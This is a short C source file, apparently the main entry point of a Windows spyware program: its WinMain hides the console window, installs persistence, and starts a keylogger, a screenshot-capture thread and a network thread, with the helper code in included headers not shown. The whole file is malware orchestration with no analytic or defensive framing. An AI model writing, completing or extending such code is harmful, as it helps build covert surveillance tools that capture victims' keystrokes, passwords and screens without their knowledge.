#include "keylogger.h"
#include "screenshot.h"
#include "persistence.h"
#include "network.h"
#include "utils.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HideConsole();
    InstallPersistence();
    StartKeylogger();
    StartScreenshotThread();
    StartNetworkThread();
    return 0;
}
